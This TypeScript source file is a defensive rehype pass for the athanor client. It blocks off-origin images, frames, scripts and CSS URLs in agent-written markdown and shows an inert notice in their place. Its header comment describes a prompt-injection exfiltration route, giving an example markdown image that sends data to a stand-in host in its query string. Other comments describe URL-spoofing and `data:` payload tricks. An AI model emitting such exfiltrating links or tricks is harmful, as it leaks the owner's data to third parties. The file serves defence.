/**
 * What a message athanor wrote is allowed to make this browser fetch, and what the owner sees
 * instead.
 *
 * A markdown image is a fetch with no click: the browser issues it the moment the message paints.
 * That makes a trailing `![](https://elsewhere.example/p.png?d=…)` a complete exfiltration channel
 * for an agent that has just read a hostile page or a hostile mail — the address carries the data
 * and the owner's own browser delivers it, with no tool call to approve, no card to answer, and
 * nothing on screen to notice. Nothing about this client has to be compromised for it to work; the
 * agent writing the message is enough, and the agent writes what it read.
 *
 * The policy, stated once and enforced three times:
 *
 *   Loaded         this box's own origin; `blob:` handles this client minted itself; and `data:`
 *                  on the elements that only ever draw it, where it carries its own bytes and
 *                  reaches no network at all.
 *   Never loaded   every other origin and every other scheme, on every element, whatever a plugin
 *                  or a future renderer decides to emit — and `data:` on the elements that would
 *                  turn it into a document, a stylesheet or a script rather than into pixels.
 *   Shown instead  an inert line naming the host, which the owner may follow deliberately, and a
 *                  sentence at the foot of the message saying that it asked and did not get.
 *
 * Three times, because a single enforcement point here is a detail of one renderer.
 * `rehypeLocalResources` rewrites the document tree, so it covers elements this client has no
 * component for and anything a plugin introduces downstream; the `img` component re-checks, so the
 * rule survives the tree walk being dropped; and `index.html` carries `img-src 'self' blob: data:`,
 * so it survives the whole markdown pipeline being replaced. The desktop shell has enforced exactly
 * this policy since it shipped — `apps/desktop/src-tauri/tauri.conf.json` — and only the browser,
 * which is how athanor is actually reached, was left open.
 */

/**
 * Why something was not loaded, which is the part that decides what the owner is told.
 *
 * They are three different sentences, and collapsing them produced a wrong one: a payload carried
 * inside the message is not "an address athanor could not read" — athanor read it perfectly well
 * and refused to run it.
 */
export type BlockedReason =
  /** An ordinary address, somewhere other than this box. */
  | 'remote'
  /** A document the message brought with it, on an element that would have run it. */
  | 'inline'
  /** Absent, empty, or a shape the URL parser refuses. */
  | 'unreadable';

export interface BlockedResource {
  /** The address as written, resolved, and kept so the owner can follow it on purpose. */
  href: string;
  /** The part a person recognises. Never trimmed of `www.`: www.evil.example is not evil.example. */
  host: string;
  /** Whether following it is an ordinary web link, or something no link should ever be. */
  followable: boolean;
  reason: BlockedReason;
}

export type ResourceVerdict = { allowed: true } | ({ allowed: false } & BlockedResource);

/**
 * Characters an address is stripped of before it is judged.
 *
 * The HTML parser drops tab, newline and carriage return from a URL attribute before resolving it,
 * so `htt\nps://elsewhere.example` is a live address that a naive check reads as a relative path.
 * The bidirectional and zero-width marks are the display half of the same trick: they leave the
 * fetched address untouched while moving the host a person reads. Both are removed so the rule
 * below judges the address the browser will actually request.
 */
// Control characters are what this removes, not an oversight: a raw newline inside an address is
// the spoof, so the class has to be able to name one. The directive sits on the pattern rather
// than on the declaration, which is only sometimes the same line once this has been wrapped.
const INVISIBLE =
  // eslint-disable-next-line no-control-regex
  /[\u0000-\u001f\u007f\u00ad\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff]/g;

/** Applied before every judgement, so this rule and the browser read the same address. */
const readable = (raw: string): string => raw.replace(INVISIBLE, '').trim();

/** Somewhere no real deployment can be, used when the page has no origin to compare against. */
const NO_ORIGIN = 'https://resource-policy.invalid';

const pageOrigin = (): string => {
  const origin = globalThis.location?.origin;
  return typeof origin === 'string' && origin && origin !== 'null' ? origin : '';
};

const blocked = (
  href: string,
  host: string,
  followable: boolean,
  reason: BlockedReason
): ResourceVerdict => ({ allowed: false, href, host, followable, reason });

/** Nothing to fetch and nothing to show: an absent, empty or unreadable address. */
const NOTHING = blocked('', '', false, 'unreadable');

/**
 * A payload carried inside the message, on an element that would have made it a document.
 *
 * Not followable and deliberately without a host: there is nowhere to go, because the address *is*
 * the content. What the owner needs to read is that the message tried to run something it brought
 * with it, which is a different sentence from naming a host.
 */
const INLINE_DOCUMENT = blocked('', '', false, 'inline');

/**
 * Elements on which a `data:` payload stops being pixels.
 *
 * Each of these parses what it is given as a document, a stylesheet or a script rather than
 * decoding it as media, and each therefore turns an address written into a message into running
 * code with a network of its own. `object-src 'none'` in `index.html` covers two of them and no
 * `frame-src` covers the rest, which is precisely why the rule is enforced here as well.
 */
const inlinePayloadRuns = new Set(['iframe', 'frame', 'embed', 'object', 'script', 'link', 'use']);

/**
 * Whether this client may fetch `raw` without asking.
 *
 * Everything is resolved against the page origin rather than pattern-matched, because the shapes
 * that mean "somewhere else" are not a closed set a regular expression can hold: `//host/p`,
 * `\\host\p`, `https:/host/p` and a scheme carrying an invisible character all resolve to a remote
 * address, and the URL parser is the only thing that agrees with the browser about which.
 */
export const classifyResource = (
  raw: unknown,
  origin = pageOrigin(),
  tagName = 'img'
): ResourceVerdict => {
  if (typeof raw !== 'string') return NOTHING;
  const value = readable(raw);
  if (!value) return NOTHING;
  const base = origin || NO_ORIGIN;
  let url: URL;
  try {
    url = new URL(value, base);
  } catch {
    // An address the URL parser refuses is one this client cannot reason about, so it does not run.
    return NOTHING;
  }
  // A data: payload is the bytes themselves, and on the elements that only ever draw them — an
  // image, a video, a sound — there is no request to make and so nothing to leak, whatever the
  // bytes contain. On the elements that turn a payload into a document or into code it is the
  // opposite: `data:text/html` in an iframe is a page with its own script, which reaches the
  // network on its own and answers to no `img-src`. The allowance is per element for that reason.
  if (url.protocol === 'data:')
    return inlinePayloadRuns.has(tagName) ? INLINE_DOCUMENT : { allowed: true };
  // A blob handle names the origin that minted it, and only this client mints them.
  if (url.protocol === 'blob:')
    return value.startsWith(`blob:${base}/`) ? { allowed: true } : NOTHING;
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return NOTHING;
  if (url.origin === base) return { allowed: true };
  return blocked(url.href, url.host, true, 'remote');
};

/**
 * A `srcset` is a list of candidates, any one of which the browser may pick, so it is judged by its
 * worst member. Every other attribute holds exactly one address — including `data:` payloads, which
 * are full of commas and must not be split.
 */
const addressesIn = (value: unknown, list: boolean): string[] => {
  if (Array.isArray(value))
    return value.flatMap((item) => (typeof item === 'string' ? addressesIn(item, list) : []));
  if (typeof value !== 'string') return [];
  if (!list) return [value];
  return value
    .split(',')
    .map((candidate) => candidate.trim().split(/\s+/)[0] ?? '')
    .filter(Boolean);
};

/** Attributes whose value is a candidate list rather than a single address. */
const listAttributes = new Set(['srcSet']);

/** The verdict for one attribute, or `undefined` when there was nothing there to fetch. */
export const attributeVerdict = (
  attribute: string,
  value: unknown,
  origin: string,
  tagName = 'img'
): ResourceVerdict | undefined => {
  for (const address of addressesIn(value, listAttributes.has(attribute))) {
    const verdict = classifyResource(address, origin, tagName);
    if (!verdict.allowed) return verdict;
  }
  return undefined;
};

/**
 * Every element that issues a request of its own accord, and the attributes that make it.
 *
 * Markdown can only produce `img` today. The rest are here because the point of enforcing on the
 * tree rather than in a component map is that a plugin, a renderer upgrade or a future feature must
 * not be able to reopen this by emitting an element nobody thought to cover.
 *
 * The names are hast property names, not attribute names, and the two differ in exactly the place
 * it matters: `property-information` calls `xlink:href` **`xLinkHref`**, with a capital L. Spelled
 * `xlinkHref` — which is how it reads and how it was written here — the entry matches no real tree,
 * so `<image xlink:href="https://elsewhere.example/p.png">` walked straight through the one pass
 * that exists to catch elements no component map covers. Both spellings and the raw attribute are
 * listed now, because a tree can also arrive from a parser that normalises differently, and naming
 * an attribute that never appears costs one failed lookup.
 */
const fetchingAttributes: Record<string, readonly string[]> = {
  img: ['src', 'srcSet', 'longDesc'],
  image: ['href', 'xLinkHref', 'xlinkHref', 'xlink:href', 'src'],
  use: ['href', 'xLinkHref', 'xlinkHref', 'xlink:href'],
  source: ['src', 'srcSet'],
  video: ['src', 'poster'],
  audio: ['src'],
  track: ['src'],
  iframe: ['src'],
  frame: ['src'],
  embed: ['src'],
  object: ['data'],
  script: ['src'],
  link: ['href'],
  input: ['src'],
  body: ['background'],
  table: ['background'],
  td: ['background'],
  th: ['background']
};

/** Schemes a link may carry. Anything else is stripped rather than rendered as a live target. */
const linkSchemes = new Set(['http:', 'https:', 'mailto:', 'tel:']);

/**
 * Inline CSS that fetches.
 *
 * `url(` is the obvious half. `image-set()` is the other one and is not a wrapper around it —
 * `background: image-set("https://elsewhere.example/p.png" 1x)` names its candidates as bare
 * strings, so a rule looking only for `url(` leaves an ordinary background image loading from
 * anywhere. The prefixed spelling is still what Safari accepts, so both are named.
 */
const STYLE_FETCHES = /url\s*\(|image-set\s*\(/i;

const nouns: Record<string, string> = {
  img: 'Image',
  image: 'Image',
  video: 'Video',
  audio: 'Audio',
  source: 'Media',
  track: 'Media',
  iframe: 'Embedded page',
  frame: 'Embedded page',
  embed: 'Embedded content',
  object: 'Embedded content'
};

/**
 * The line the owner reads where the picture would have been.
 *
 * It names the host, because "an image did not load" is a bug report while "an image on
 * elsewhere.example did not load" is the fact that matters. The alt text stays in front of it, so
 * whatever the agent meant to show is still described.
 */
const whereFrom = (resource: BlockedResource): string => {
  if (resource.reason === 'inline') return 'from a document written into this message';
  return resource.host ? `from ${resource.host}` : 'from an address athanor could not read';
};

export const blockedResourceText = (
  tagName: string,
  alt: string,
  resource: BlockedResource
): string => {
  const noun = nouns[tagName] ?? 'Content';
  const where = whereFrom(resource);
  const described = alt.trim();
  return described
    ? `${described} — ${noun.toLowerCase()} not loaded, ${where}`
    : `${noun} not loaded, ${where}`;
};

interface TreeNode {
  type: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: TreeNode[];
  value?: string;
}

const textOf = (value: unknown): string => (typeof value === 'string' ? value : '');

/** Everything one message was refused, gathered while its tree is walked. */
export interface Suppressed {
  /** How many elements were replaced, including the ones with no host to name. */
  total: number;
  /** The distinct remote hosts among them, in the order the message asked for them. */
  hosts: string[];
}

/**
 * What replaces a suppressed element.
 *
 * A link when the address is an ordinary web address, so the owner keeps the choice; plain text
 * when it is not, because a scheme this client refuses to fetch is not one it should offer to open
 * either. Inside an existing link it is always text: nested anchors are markup the browser takes
 * apart, and the outer link is the owner's, not the suppressed resource's.
 */
const inertNode = (
  original: TreeNode,
  resource: BlockedResource,
  insideLink: boolean
): TreeNode => {
  const tagName = textOf(original.tagName).toLowerCase();
  const label = blockedResourceText(tagName, textOf(original.properties?.alt), resource);
  const children: TreeNode[] = [{ type: 'text', value: label }];
  if (!resource.followable || !resource.href || insideLink)
    return {
      type: 'element',
      tagName: 'span',
      properties: { className: ['blocked-resource'] },
      children
    };
  return {
    type: 'element',
    tagName: 'a',
    properties: {
      href: resource.href,
      className: ['blocked-resource'],
      target: '_blank',
      rel: ['noreferrer', 'noopener'],
      referrerPolicy: 'no-referrer',
      title: `athanor did not load this. Opening it sends a request to ${resource.host}.`
    },
    children
  };
};

/**
 * Everything done to one element: the fetching attributes it must not carry, plus the two that
 * fetch without being one — a `style` naming a URL, and a link `ping`, which posts to a third party
 * the moment the owner clicks.
 *
 * Returns a replacement when the element cannot stay, and `undefined` when it was repaired in place.
 */
const neutralise = (
  node: TreeNode,
  origin: string,
  insideLink: boolean,
  suppressed: Suppressed
): TreeNode | undefined => {
  const properties = node.properties;
  const tagName = textOf(node.tagName).toLowerCase();
  if (properties) {
    if (typeof properties.style === 'string' && STYLE_FETCHES.test(properties.style))
      delete properties.style;
    delete properties.ping;
  }
  if (tagName === 'a' || tagName === 'area') {
    if (properties && typeof properties.href === 'string') {
      let scheme = '';
      try {
        scheme = new URL(readable(properties.href), origin || NO_ORIGIN).protocol;
      } catch {
        scheme = '';
      }
      if (!linkSchemes.has(scheme)) delete properties.href;
    }
    return undefined;
  }
  const attributes = fetchingAttributes[tagName];
  if (!attributes || !properties) return undefined;
  for (const attribute of attributes) {
    const verdict = attributeVerdict(attribute, properties[attribute], origin, tagName);
    if (!verdict || verdict.allowed) continue;
    suppressed.total += 1;
    if (verdict.host && !suppressed.hosts.includes(verdict.host))
      suppressed.hosts.push(verdict.host);
    return inertNode(node, verdict, insideLink);
  }
  return undefined;
};

const walk = (
  node: TreeNode,
  origin: string,
  insideLink: boolean,
  suppressed: Suppressed
): void => {
  const children = node.children;
  if (!Array.isArray(children)) return;
  for (let index = 0; index < children.length; index += 1) {
    const child = children[index];
    if (!child) continue;
    if (child.type !== 'element') {
      walk(child, origin, insideLink, suppressed);
      continue;
    }
    const replacement = neutralise(child, origin, insideLink, suppressed);
    if (replacement) {
      children[index] = replacement;
      continue;
    }
    walk(child, origin, insideLink || textOf(child.tagName).toLowerCase() === 'a', suppressed);
  }
};

/**
 * The sentence at the foot of a message that asked for something it was not given.
 *
 * The inline mark alone is not enough. It sits exactly where the resource was, which for an
 * exfiltration attempt is the last line of a long answer or a cell in the middle of a table —
 * somewhere a reader scrolling an agent's work will not look. The one fact that has to survive
 * skim-reading is that this message tried to make this browser talk to somebody else, so it is
 * stated once, at the end, in the message's own voice.
 *
 * It is derived from the walk rather than from the source text, so it cannot claim a suppression
 * that did not happen or miss one that did.
 */
export const suppressionSummary = (
  suppressed: Suppressed
): { headline: string; detail: string } | undefined => {
  if (!suppressed.total) return undefined;
  const things = suppressed.total === 1 ? '1 address' : `${suppressed.total} addresses`;
  const [first, second, ...rest] = suppressed.hosts;
  const where = !first
    ? 'written into the message itself'
    : rest.length
      ? `on ${first}, ${second} and ${rest.length} more`
      : second
        ? `on ${first} and ${second}`
        : `on ${first}`;
  return {
    headline: 'athanor did not fetch what this message asked for',
    detail: `${things} ${where}. A request carries whatever is written into it, so this one was not made.`
  };
};

const summaryNode = (summary: { headline: string; detail: string }): TreeNode => ({
  type: 'element',
  tagName: 'div',
  properties: { className: ['blocked-resource-summary'] },
  children: [
    {
      type: 'element',
      tagName: 'strong',
      properties: {},
      children: [{ type: 'text', value: summary.headline }]
    },
    {
      type: 'element',
      tagName: 'span',
      properties: {},
      children: [{ type: 'text', value: summary.detail }]
    }
  ]
});

/**
 * The rehype pass that applies the policy to a whole document.
 *
 * It runs last, after every other plugin, so what it sees is the tree that is about to be rendered
 * rather than the tree the markdown parser produced — which is the difference between a rule about
 * markdown and a rule about what this client fetches.
 */
export const rehypeLocalResources =
  (options?: { origin?: string }) =>
  (tree: unknown): void => {
    const origin = options?.origin ?? pageOrigin();
    if (!tree || typeof tree !== 'object') return;
    const root = tree as TreeNode;
    const suppressed: Suppressed = { total: 0, hosts: [] };
    walk(root, origin, false, suppressed);
    const summary = suppressionSummary(suppressed);
    if (summary && Array.isArray(root.children)) root.children.push(summaryNode(summary));
  };
